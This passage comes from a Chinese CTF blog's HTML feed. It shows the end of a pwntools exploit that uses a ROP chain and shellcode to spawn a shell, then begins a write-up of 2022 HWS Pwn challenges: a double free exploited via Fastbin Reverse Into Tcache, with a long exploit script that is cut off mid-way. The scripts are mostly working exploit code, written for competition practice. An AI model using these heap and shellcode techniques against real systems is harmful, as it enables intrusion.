class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdbscript += <span class="hljs-string">&#x27;b fprintf&#x27;</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./devnull&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./devnull&#x27;)</span><br><span class="hljs-comment"># debug(0x4014E3)</span><br>p = remote(<span class="hljs-string">&#x27;47.94.166.51&#x27;</span>,<span class="hljs-number">33797</span>)<br>addr = <span class="hljs-number">0x3fe000</span> + <span class="hljs-number">0x500</span><br>leave_ret = <span class="hljs-number">0x401511</span><br>rax_leave_ret = <span class="hljs-number">0x401350</span> <span class="hljs-comment"># mov rax, [rbp+s];leave;ret;</span><br>len_rax_mprotect = <span class="hljs-number">0x4012D0</span> <span class="hljs-comment"># len = 0x1000 addr = rax mprotect</span><br><span class="hljs-comment"># sea(&quot;please input your filename\n&quot;,&#x27;/bin/sh\0&#x27;.ljust(0x20,&#x27;\0&#x27;)+&#x27;\x00&#x27;+&#x27;\0&#x27;*0x13+p64(0x404010))</span><br>sea(<span class="hljs-string">&quot;please input your filename\n&quot;</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\0&#x27;</span>*(<span class="hljs-number">0x1c</span>-<span class="hljs-number">8</span>)+p64(addr)+p64(addr+<span class="hljs-number">0x18</span>)+p64(rax_leave_ret))<br>shellcode = asm(<br>  <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  push 0</span><br><span class="hljs-string">  pop rax</span><br><span class="hljs-string">  xchg rdi,rsi</span><br><span class="hljs-string">  xchg rdi,rdx</span><br><span class="hljs-string">  push 0</span><br><span class="hljs-string">  pop rdi</span><br><span class="hljs-string">  syscall</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span><br>)<br>payload = p64(<span class="hljs-number">0x3fe000</span>) <span class="hljs-comment"># rax</span><br>payload = payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>payload += p64(len_rax_mprotect) + p64(<span class="hljs-number">0</span>) + p64(addr+<span class="hljs-number">0x38</span>) + shellcode<br>sea(<span class="hljs-string">&quot;please input your new data\n&quot;</span>,payload)<br><br>sleep(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># sl(&#x27;\0&#x27;*0x546+asm(shellcraft.cat(&#x27;./flag&#x27;,fd=2)))</span><br><span class="hljs-comment"># sl(&#x27;\0&#x27;*0x546+asm(shellcraft.write(2,&#x27;rsp&#x27;,&#x27;0x50&#x27;)))</span><br>sl(<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x546</span>+asm(shellcraft.sh()))<br>sleep(<span class="hljs-number">2</span>)<br>sl(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>sleep(<span class="hljs-number">2</span>)<br>sl(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>p.interactive()<br><br><br></code></pre></td></tr></table></figure><p>什么，你说复现哪去了？在学了在学了。（悲</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022HWS 夏令营入营赛 Pwn 题解</title>
    <link href="/posts/cb6560d6.html"/>
    <url>/posts/cb6560d6.html</url>
    
    <content type="html"><![CDATA[<p>和强网杯撞了，浅浅做完了pwn，其他的也不大会。</p><p>最近有点摸 wp 没有仔细整理，师傅们看看看看思路就行。</p><h1>PWN</h1><h2 id="pwn1"><a class="header-anchor" href="#pwn1">¶</a>pwn1</h2><p>二血题</p><p>难点在交互，解决了 RSA 之后就比较好做了，采取的是在处理函数内部下断点，dump 出 n 和 e 的思路。</p><p>漏洞点在 free 时没有清空 content 指针，可以河里堆风水进行 Double Free。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220729192811416.png" alt="pwn1"></p><p>最后拿的 Fastbin Reverse Into Tcache 打 one gadget ，顺利拿到了 shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %self/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;tcp.dasc.buuoj.cn&#x27;</span>,<span class="hljs-number">27495</span>)<br>P = <span class="hljs-number">16617127</span><br>Q = <span class="hljs-number">7578299081774973675168926220497127633745768478826174746554492422165802765780212810518589529228694315205511189705177457329278843566817056465274478392762585485827514172817826950842752547461016536920016232514874472692360067934908514830732106744500567245807025552586514363470336002166323093239378322678157</span><br>N = P*Q<br>PHI = (P-<span class="hljs-number">1</span>)*(Q-<span class="hljs-number">1</span>)<br>D = invmod(<span class="hljs-number">0x10001</span>,PHI)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size=<span class="hljs-number">0x10</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,tf=<span class="hljs-string">&#x27;n&#x27;</span>,name=<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">40</span></span>):<br>    msg = <span class="hljs-built_in">str</span>(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;\n&#x27;</span> + name<br>    msg = n2s((<span class="hljs-built_in">pow</span>(s2n(msg),D,N)))<br>    lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(msg))<br>    sea(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(msg).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>    <span class="hljs-keyword">if</span> tf == <span class="hljs-string">&#x27;y&#x27;</span>:<br>        sla(<span class="hljs-string">&#x27;Want to add description?(y/n) &#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>)<br>        sea(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sea(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(content))<br>    <span class="hljs-keyword">else</span>:<br>        sla(<span class="hljs-string">&#x27;Want to add description?(y/n) &#x27;</span>,<span class="hljs-string">&#x27;n&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">name</span>):<br>    msg = <span class="hljs-built_in">str</span>(<span class="hljs-number">0x102</span>) + <span class="hljs-string">&#x27;\n&#x27;</span> + name<br>    msg = n2s((<span class="hljs-built_in">pow</span>(s2n(msg),D,N)))<br>    lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(msg))<br>    sea(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(msg).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    msg = <span class="hljs-built_in">str</span>(<span class="hljs-number">0x105</span>) + <span class="hljs-string">&#x27;\n&#x27;</span> + <span class="hljs-string">&#x27;\0&#x27;</span><br>    msg = n2s((<span class="hljs-built_in">pow</span>(s2n(msg),D,N)))<br>    lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(msg))<br>    sea(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(msg).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">name,data</span>):<br>    msg = <span class="hljs-built_in">str</span>(<span class="hljs-number">0x201</span>) + <span class="hljs-string">&#x27;\n&#x27;</span> + name + <span class="hljs-string">&#x27;;&#x27;</span> + data<br>    msg = n2s((<span class="hljs-built_in">pow</span>(s2n(msg),D,N)))<br>    lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(msg))<br>    sea(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(msg).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br>msg = <span class="hljs-built_in">str</span>(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;\n&#x27;</span> + <span class="hljs-string">&#x27;\0&#x27;</span><br>msg = n2s((<span class="hljs-built_in">pow</span>(s2n(msg),D,N)))<br><span class="hljs-comment"># msg = pack(msg)</span><br><span class="hljs-comment"># msg = cyclic(0x100)</span><br><span class="hljs-comment"># x/20xg $rebase(0x206090)</span><br><span class="hljs-comment"># x/20xg $rebase(0x206140)</span><br><span class="hljs-comment"># tel 0x7fffffffdd10 20</span><br><span class="hljs-comment"># add(0x10,name=&#x27;AB1&#x27;)</span><br><span class="hljs-comment"># x/20xg $rebase(0x2060A0)</span><br>add(<span class="hljs-number">0x450</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>,name=<span class="hljs-string">&#x27;FK1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x01&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x02&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;FK2&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM2&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND2&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x03&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x04&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br><br>dele(<span class="hljs-string">&#x27;FK1&#x27;</span>)<br>add(<span class="hljs-number">0x420</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>,name=<span class="hljs-string">&#x27;FK1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x01&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x02&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x3ec075</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>dele(<span class="hljs-string">&#x27;FK1&#x27;</span>)<br>add(<span class="hljs-number">0x420</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;FK1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x01&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x02&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>show()<br>ru(<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">6</span>))<br>heap_base = heap_leak - <span class="hljs-number">0x330</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;AB0&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM3&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND3&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x05&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x06&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x70</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;AB1&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM4&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND43&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x07&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x08&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>dele(<span class="hljs-string">&#x27;AB0&#x27;</span>)<br>dele(<span class="hljs-string">&#x27;AB1&#x27;</span>)<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;AB3&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM5&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND5&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x09&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x0a&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x20</span>,tf=<span class="hljs-string">&#x27;n&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=<span class="hljs-string">&#x27;AB0&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;NM3&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;ND3&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x05&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-string">&#x27;\x06&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-comment"># for i in range(3):</span><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">0</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">2</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>)).ljust(<span 